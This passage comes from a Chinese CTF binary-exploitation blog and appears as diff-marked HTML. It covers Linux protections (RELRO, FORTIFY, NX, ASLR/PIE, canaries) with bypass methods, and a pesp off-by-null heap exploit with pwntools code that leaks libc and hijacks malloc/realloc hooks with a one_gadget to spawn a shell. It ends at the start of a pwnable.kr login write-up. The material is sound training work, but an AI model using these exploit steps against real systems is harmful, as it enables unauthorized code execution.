 <p>这里需要在当前目录下新建一个 poc 文件夹，把 exp.c 文件放进去，或者自己修改下脚本也可以，另外还需要安装musl-gcc，在ubuntu下：apt-get install musl-tools</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191511955.jpeg" alt="img"></p>
 <p>这是sixstars 战队中一位师傅的脚本，不知道是哪位大佬的。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/">pwn保护措施</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、RELRO: (ReLocation Read-Only)</p>
-<p>1.功能：解决延迟绑定问题，将符号重定向表设置为只读，或者在程序启动时就解析并绑定所有动态符号，防止got表被篡改。</p>
-<p>2.表现形式：</p>
-<p>pwn checksec检查为RELRO: Full RELRO，Partial RELRO保护</p>
-<p>3.保护等级：</p>
-<p>(1)Partial RELRO:</p>
-<p>①一些段(.dynamic、.got等)在初始化后会被标记只读，.got段代表无plt指向的got表，也就是没有发生延迟绑定，没有被外部extern导入的函数被标记为只读。</p>
-<p>②但是有被外部extern导入的函数，发生延迟绑定的函数，在.got.plt段，仍然可以篡改got表，这里的got表是.got.plt段。</p>
-<p>(2)Full RELRO:直接禁止延迟绑定，无.got.plt段，只有.got段，且被标记为只读，无法修改，无法篡改got表。</p>
-<p>4.绕过方法：有啥绕过方法，不改got表不就完了。</p>
-<p>二、FORTIFY_SOURCE:</p>
-<p>1.功能：将敏感函数如read, fgets, memcpy, printf等等添加保护，替换为__read_chk, __fgets_chk, __memcpy_chk, __printf_chk等函数。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串漏洞的出现。（如直接%7$x）</p>
-<p>2.表现形式：带有chk的函数，checksec可以检测到</p>
-<p>3.保护等级：</p>
-<p>(1)-Ol -D_FORTIFY_SOURCE=0：关闭</p>
-<p>(2)-Ol -D_FORTIFY_SOURCE=1：替换get，memecpy等，格式化字符串仍然可用</p>
-<p>(3)-Ol -D_FORTIFY_SOURCE=2：格式化字符串也受到限制：</p>
-<p>%n，%3$x不可用(跳过了1，2不可用)</p>
-<p>%n$只能从1开始才可以：%1$x%2$x可用</p>
-<p>4.绕过方法：</p>
-<p>(1)利用整数溢出漏洞，篡改_IO_FILE结构中的_IO_FLAGS2_FORTIFY为0，从而关闭FORTIFY_SOURCE对%n的检查。之后再利用任意地址写，将nargs篡改为0，从而关闭对%n$的检查。</p>
-<p>具体论文：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://phrack.org/issues/67/9.html(%E8%A6%81%E6%8C%82" >http://phrack.org/issues/67/9.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://jackgrence.github.io/phrack-67-9/" >https://jackgrence.github.io/phrack-67-9/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html" >https://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>都得挂vpn才能看</p>
-<p>三、NX:NX enabled (No execute bit)</p>
-<p>1.功能：将内存页以数据和指令两种方式进行了分类。被标记为数据页的内存页（如栈和堆）上的数据无法被当成指令执行，即没有X属性，这样就会导致shellcode失效。除了.text之外，其余段，数据(stack、heap等)都不可执行。</p>
-<p>2.表现形式：pwn checksec检查</p>
-<p>3.绕过方法：ROP、Onegadget、ret2libc等等</p>
-<p>四、ASLR(Address Space Layout Randomization)和PIE(Position Independent Executable)</p>
-<p>1.功能：该技术是一个针对堆、栈、libc地址、代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，每次加载程序都会随机化这些地址。</p>
-<p>2.表现形式：checksec检查，gdb-peda中输入aslr。</p>
-<p>3.不同：</p>
-<p>(1)ASLR是系统层面的地址随机，针对栈(stack)，libc加载地址，堆(heap)，没办法在编译时选择是否开启ASLR，不同系统设置下都不一样，只有在程序跑起来，远程调试才能看到随机化。可以在终端输入：</p>
-<p>cat /proc/sys/kernel/randomize_va_space</p>
-<p>查看当前系统的随机化等级，也可以打开这个文件进行修改等级。共分为3个等级：</p>
-<p>A.0：即关闭ASLR</p>
-<p>B.1：部分开启，随机化stack和libc加载地址，不随机化heap</p>
-<p>C.2：完全开启，随机化stack、libc加载地址、heap</p>
-<p>▲注：</p>
-<p>由于是系统层面的，做pwn题时肯定是不知道远程的系统环境到底有没有开启ASLR，一般都是默认开启，且都是2等级。做题做到现在没见过哪个题目告诉不开启ASLR的。另外在gdb-peda中查看aslr都是默认为off，因为gdb默认关闭ASLR，可以在gdb-peda中输入aslr on来打开ASLR。</p>
-<p>(2)PIE是gcc编译功能时的选项，针对代码段(.text)、初始化数据段(.data)、未初始化数据段(.bss)的防护技术。开启之后，以上提到的都会随机化，同样也是远程调试跑起来才能看到效果。需要注意的是，只有开启了ASLR之后，PIE才能被正常使用。</p>
-<p>4.绕过方法：</p>
-<p>(1)利用vsyscall或者vdso来滑过一段栈空间，从而将eip挪移到栈底下方我们想要的地址处。</p>
-<p>(2)利用栈溢出和打印函数的参数，修改劫持rbp使得利用rbp寻址的打印函数的参数指向栈上其它位置，通过爆破来寻求泄露Libc地址。</p>
-<p>(3)利用PIE机制，爆破倒数第四位可以跳转到同一个内存页中的任意函数。</p>
-<p>五、Stack Canary/Stack cookies</p>
-<p>1.功能：函数退出时，将保存在栈rbp-0x08处的canary和tcbhead_t结构体中的stack_guard来xor操作，若检查到改变则代表执行了栈溢出漏洞，程序调用__stack_chk_fail，打印错误信息，并崩溃。</p>
-<p>2.表现形式：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov rax,fs:28h</span><br><span class="line">mov [rsp+28h+var_20], rax</span><br><span class="line">------------------------------------------------------</span><br><span class="line">mov rax, [rsp+28h+var_20]</span><br><span class="line">xor rax, fs:28h</span><br><span class="line">call __stack_chk_fail</span><br><span class="line">------------------------------------------------------</span><br><span class="line">v_canary = __readfsqword(0x28u);</span><br><span class="line">return __readfsqword(0x28u) ^ v_canary;</span><br></pre></td></tr></table></div></figure>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pesp_off-by-null/">pesp_off-by-null</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方)</p>
+<p>2.先梳理一下0字节溢出漏洞，一般的chunk改内容都是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">read(0, chunk_ptr, size);</span><br></pre></td></tr></table></div></figure>
 
-<p>3.不同类型的canary:</p>
-<p>(1)Terminator canaries:</p>
-<p>最常见的canary，末尾为\x00，保存在rpb - 0x08的位置。</p>
-<p>(2).Random canaries:</p>
-<p>在程序初始化时随机生成，保存在一个相对安全的位置。通常由/dev/urandom来生成，有时也使用当前时间的哈希值。</p>
-<p>(3).Random XOR canaries:</p>
-<p>通过一个随机数和函数栈中所有控制信息，返回地址等异或运算得到的，这样当函数栈中的随机数或与之相关的控制信息，返回地址被修改了，都可以检测到。</p>
-<p>2.绕过方法：</p>
-<p>(1)有循环时，32或者64位程序下都可以逐字节爆破绕过。</p>
-<p>(2)可通过printf字符串漏洞来泄露(%p.%p.%p….)。</p>
-<p>(3)通过打印栈上数据的打印函数栈溢出连上canary泄露出来。</p>
-<p>(4)当程序读入flag进入内存时，利用函数__stack_chk_fail，加上足够长度的栈溢出覆盖argv[0]为程序中保存flag的地址。这样当__stack_chk_fail运行时就会打印出argv[0]中地址上对应的内容，也就是flag。</p>
-<p>(5)由pthread创建出来的线程函数中如果有足够长度的栈溢出，可以直接覆盖canary来源tcbhead_t结构体中的canary和栈中的canary为同一数值，这样检查仍旧通过。</p>
-<p>(64位中为fs:[28h]，32位中为gs:[14h])</p>
-<p>▲长度一般为rbp+2000左右，不同的Libc版本都不太一样，需要调试才能知道。原因是通过pthread出来的线程函数栈会被安置到与TLS相差约2000字节的距离处：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519177.png" alt="img">    <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519553.png" alt="img"></p>
-<p>这里可以看到，第一个是main函数栈，第二个是在main函数中通过pthread进程创建并且调用的函数栈，两者相差将近0x700000000这么远，完全不是正常的函数调用相差的栈距离。同时在该函数中rbp指向的始终是0000(全是)，该函数结束后会先跳转到libc中的libpthread来恢复栈。</p>
-<p>▲64位的tcbhead_t结构体：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">               thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  int gscope_flag;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;//即为canary，fs:28h处</span><br><span class="line">  uintptr_t pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></div></figure>
+<p>这样就只能输入size这么大的内容，但是这道题中，在add函数中和change函数中：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg" alt="img"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg" alt="img"></p>
+<p>可以看到给chunk添加内容的语句都是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null</span><br></pre></td></tr></table></div></figure>
 
+<p>这样当我们将chunk内容顶满之后，程序会将chunk指针最后部分再溢出一个字节赋值为0，这就是off-by-null。</p>
+<p>由于scanf函数会在末尾自动补\x00，这其实也是一种off-by-null，</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char buf[10];</span><br><span class="line">scanf(&quot;10%s&quot;,buf);</span><br></pre></td></tr></table></div></figure>
+
+<p>▲free源码：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((long ) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>也就是如果当前chunk的IN_USE位为0，那么就根据当前chunk的pre_size位，找到前一个chunk_pre，将chunk_pre的size位改成size+pre_size，通过Unlink取出chunk_pre，准备合并。(之后的检查代码会再循环，也就是再看chunk_pre的IN_USE位是不是0来判断要不要再向上合并，这里不重要)</p>
+<p>所以如果我们通过off-by-null，溢出0到chunk_next的size位中的IN_USE位，那么当前chunk就会被标记为Free，这样在Free(chunk_next)时，就会将chunk和chunk_next合并。如果我们又更改了chunk_next的pre_size位，使它变得更大，那么就可以向上合并更大的chunk块。这就是off-by-null的利用方法，这题中如下：</p>
+<p>(需要注意的是，由于溢出的是一个字节而不是一个Bit，所以size一般都设置为0xf0，从而使size位变成0x101，溢出之后进而变成0x100。但如果size最开始设置为0x20，size位就是0x30，溢出0字节就会变成0x00，那样程序照样崩溃。)</p>
+<p>(1)先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
+<p>(2)然后free掉chunk0，(这里chunk0需要足够大，一般得大于0x80，也就是MAX_fastbins)，使其进入unsortedbins中。(这里必须free掉chunk0，不然之后修改掉chunk2的pre_size位时，然后free掉chunk2时，程序依据pre_size来判断是否合并时，发现chunk0仍旧处于使用当中，但pre_size包含了chunk0，就会造成程序崩溃)</p>
+<p>(3)修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
+<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中，调试过程可以发现，chunk0的size位被修改成了sizeof(chunk0+chunk1+chunk2)。但是这里实际情况中，chunk1并没有被释放，只是它的内存处在被释放的内存中间，依然可以通过chunk1的指针来操作。也就是在这个程序中依旧可以进行edit来修改chunk1，或者show来打印chunk1。</p>
+<p>(5)再次申请chunk0大小，这样就会割裂unsortedbins中的remainder为chunk0+new_remainder，把chunk0申请回来，剩下的new_remainder依旧放在unsortedbins中。在unsortedbins中的remainder有个特点，就是该chunk的fd和bk一定指向unsortedbins链表头部，(如果有多个remainder，那么顺序类似于smallbins，依旧可以使用第一个chunk的bk来获取unsortedbins链表头部)</p>
+<p>(6)那么现在unsortedbins中有chunk1和chunk2，而chunk1的fd和bk都指向unsortedbins链表头部，并且在程序中chunk1仍旧处于使用状态，fd和bk就是chunk1的data部分。所以show函数就可以打印出chunk1的data部分，从而打印出fd和bk指向的unsortedbins头部链表地址。又由于unsortedbins处在main_arena+0x58位置，而main_arena相对于libc基地址的偏移是固定的，为0x3c4b20(不同glibc版本可能不同，这是libc2.23的)，所以这也就间接泄露出了libc基地址。</p>
+<p>▲查询main_arena方法：</p>
+<p>①工具查询：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/coldwave96/libcoffset%EF%BC%9A" >https://github.com/coldwave96/libcoffset：</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>②IDA查询：main_arena存储在libc.so.6文件的.data段，使用IDA打开libc文件，然后搜索函数malloc_trim()</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg" alt="img"></p>
+<p>3.现在有了libc基地址，那么接下来就考虑修改mallo_hook和realloc_hook的值。同样使用0字节溢出漏洞，伪造fakechunk为mallo_hook地址，修改fakechunk从而修改malloc_hook和realloc_hook。这里先忽略上面的，程序中的索引会不太一样。攻击思路如下：</p>
+<p>(1)先申请一个较大的chunk，防止和上面的合并</p>
+<p>(2)之后的操作方法类似，先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
+<p>(3)free掉chunk0，使其进入unsortedbins中。修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
+<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中。再free掉chunk1，使其进入fastbins中。这样chunk1即在fastbins中，也处在unsortedbins中。</p>
+<p>(5)申请一个特殊大小的chunk块，最小为chunk0_size+0x20，使其的data部分足够大，能够修改掉chunk1的fd位，将chunk1的fd位指向fakechunk，由于需要从size位覆盖到fd，所以需要伪造合法的size，为chunk1_size。</p>
+<p>(6)申请两个chunk1大小的chunk_a，chunk_b，这样第一次申请的chunk_a就是从fastbins中回来的chunk1。而chunk_b就是chunk1的fd指向的fakechunk。这样如果将fakechunk放在realloc_hook之前，那么就可以修改掉realloc_hook和malloc_hook，使得realloc_hook指向one_gadget，而malloc_hook指向__libc_libc函数中的某个可以控制栈帧的地址，从而满足gadget条件来getshell。</p>
+<p>4.开始编写exp，增删改查函数就不说了:</p>
+<p>(1)获取libc基地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;0&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;1&#x27;*0x68)#trigger 0ff-by-null</span><br><span class="line">add(0xf0,&#x27;2&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;3&#x27;*0x10)</span><br><span class="line">#chunk0,chunk1,chunk2,chunk3(防止合并)</span><br><span class="line"></span><br><span class="line">delete(0)#防止程序崩溃</span><br><span class="line">edit(1,0x68,flat(&#x27;1&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(2)</span><br><span class="line">#触发chunk2的pre_size作用</span><br><span class="line"></span><br><span class="line">#关键就在这个add，目的就是将unsortedbins的链表头部放到chunk1的fd和bk位</span><br><span class="line">add(0xf0,&#x27;x&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">#现在就可以打印chunk1来获取unsortedbins链表的头部地址，从而计算得到libc地址</span><br><span class="line">show()</span><br><span class="line">libc_address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ]+&#x27;\0\0&#x27;)-0x3c4b78</span><br><span class="line">print(&quot;libc @ &#123;:#x&#125;&quot;.format(libc_address))</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)伪造fakechunk：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x160,&#x27;4&#x27;*0x160)</span><br><span class="line">#第一个chunk防止合并加程序崩溃</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;a&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;b&#x27;*0x68)</span><br><span class="line">add(0xf0,&#x27;c&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;d&#x27;*0x10)</span><br><span class="line">#四个chunk，套路一样。由于程序编写原因，所以索引变成chunk4,chunk5,chunk6,chunk7,对应上面的chunk0,chunk1,chunk2,chunk3。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(4)#防止程序崩溃</span><br><span class="line">edit(5,0x68,flat(&#x27;b&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(6)</span><br><span class="line">#触发chunk6的pre_size作用</span><br><span class="line"></span><br><span class="line">delete(5)</span><br><span class="line">add(0x120,flat(&#x27;A&#x27;*0xf8,0x70,(libc_address+0x3c4aed)))</span><br><span class="line">#使得chunk5进入fastbins，之后修改其fd位，创造一个fakechunk进入fastbins。这里的fakechunk_addr就是libc_address+0x3c4aed。这里的0x70写成0x71也是一样的，因为之后是malloc，不会管chunk的IN_USE位，也就是P位。</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)申请获得fakechunk，同时修改该fakechunk，劫持malloc_hook和realloc_hook。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x68,&#x27;x&#x27;*0x10)</span><br><span class="line">add(0x68,flat(&#x27;\0&#x27;*11,(libc_address+one_gadget),(libc_address+16+libc.sym[&quot;__libc_realloc&quot;])))</span><br></pre></td></tr></table></div></figure>
+
+<p>(4)随便申请一个chunk即可getshell，但是这里不要使用之前我们定义的add函数，因为程序一旦call malloc即可getshell，即运行到输入长度即可，但是我们的add函数中一直运行到输入内容才结束，会导致程序卡住，所以应该是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">io.sendlineafter(&quot;:&quot;,&quot;anything&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>5.这里需要很多调试的步骤：</p>
+<p>(1)从最开始打算伪造fakechunk时就应该知道我们的chunk大小应该设置为0x68，因为程序跑起来是0x7f开头，拿来伪造size再合适不过，这样的chunk大小是0x70。而我们又只能用0字节溢出，所以需要将chunk设置到最大，也就是0x70-0x08。</p>
+<p>(2)而0xf0可以改变，只要比fastbins_MAX大就行，那么对应的0x170也需要改变，同时也要改变0x120。</p>
+<p>(3)申请fakechunk步骤中的’\0’*11也是需要通过调试算出来，方法就是gdb查看realloc_hook-0xxx附近的内存，选择合适的可以伪造size的地址，之后通过填充padding来覆盖realloc_hook和malloc_hook。</p>
+<p>(4)onegadget相关的+16也得通过调试才能知道，这里选取的onegadget条件是[rsp+0x30]==Null。所以调试时将断点下在__libc_realloc函数上，进入__libc_realloc函数，从而一直进入到onegadget的执行代码中，如下：</p>
+<p>先下断点让程序运行到这<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg" alt="img"></p>
+<p>再输入ni进入:<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg" alt="img"></p>
+<p>这时候就可以看rsp的值了：<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg" alt="img"></p>
+<p>这里的rsp是0x7ffca3331eb8，rsp+0x30=0x7ffca3331ee8，对应图中的值就得是0才满足条件(这里已经计算过了，+16)</p>
+<p>▲如果从最开始进入__libc_realloc函数，进入到onegadget中之后，发现条件不满足，那么需要观察前后的值，从而决定从哪里进入__libc_realloc函数才能使得rsp满足。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg" alt="img"></p>
+<p>因为__libc_realloc(就是realloc)函数有一堆的push和sub操作，少一个push，那么rsp就可以下挪0x08，相当于rsp+0x08，中间还有sub rsp,xxh，相当于上挪rsp。所以决定从哪里进入realloc函数决定了onegadget的成功与否。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg" alt="img"></p>
+<p>而通过汇编代码可以看到，实际的onegaget是通过0x84724 mov rax,cs:__realloc_hook_ptr传进来，之后由于</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">test rax rax</span><br><span class="line">jnz  loc_84958</span><br></pre></td></tr></table></div></figure>
+
+<p>rax不为0，必定跳转loc_84958:</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg" alt="img"></p>
+<p>这里才是我们选择调用进入onegadget的入口。所以之前在__libc_realloc的计算都是为了调整栈帧，不然其实如果栈帧不用调整就可以满足，那么我们可以直接将malloc_hook改成onegadget也可以直接getshell。因为__libc_malloc函数中的汇编代码也是类似的：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg" alt="img"></p>
+<p>而且这还是一个无条件跳转。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg" alt="img"></p>
+<p>可以看到有两个push,一个sub rsp,8;两个Pop。相当于只要在call malloc之前，我们的rsp+0x28==NULL即可满足onegadget的rsp+0x30==NULL的条件。当然，以上只是在Libc2.23下的，如果是其它版本的libc就可能不太一样。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwnable.kr-login/">pwnable.kr-login</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec一下，开了canary和NX，然后IDA打开分析漏洞。发现auth函数中可能存在栈溢出：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int v4; // [esp+20h] [ebp-8h]</span><br><span class="line">------------------------------------</span><br><span class="line">memcpy(&amp;v4, &amp;input, a1);</span><br></pre></td></tr></table></div></figure>
+
+<p>如果a1大于8h，而我们可以控制input，那么就可以造成栈溢出。再往上翻一下，发现就是将我们的输入通过一系列操作给到input，然后a1是input的长度。</p>
+<p>实际情况是将我们的输入给s，进行Base64解码，然后给v4，长度给v6。v4又给input，v6传值到达auth函数赋值给a1。这里input是全局变量，所以auth函数中的input中的内容其实就是我们输入经过base64解码的内容。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">_isoc99_scanf(&quot;%30s&quot;, &amp;s);</span><br><span class="line">--------------------------------------------------</span><br><span class="line">v6 = Base64Decode((int)&amp;s, &amp;v4);</span><br><span class="line">--------------------------------------------------</span><br><span class="line">memcpy(&amp;input, v4, v6);</span><br><span class="line">------------------------------------------------------</span><br><span class="line">auth(v6) == 1</span><br></pre></td></tr></table></div></figure>
+
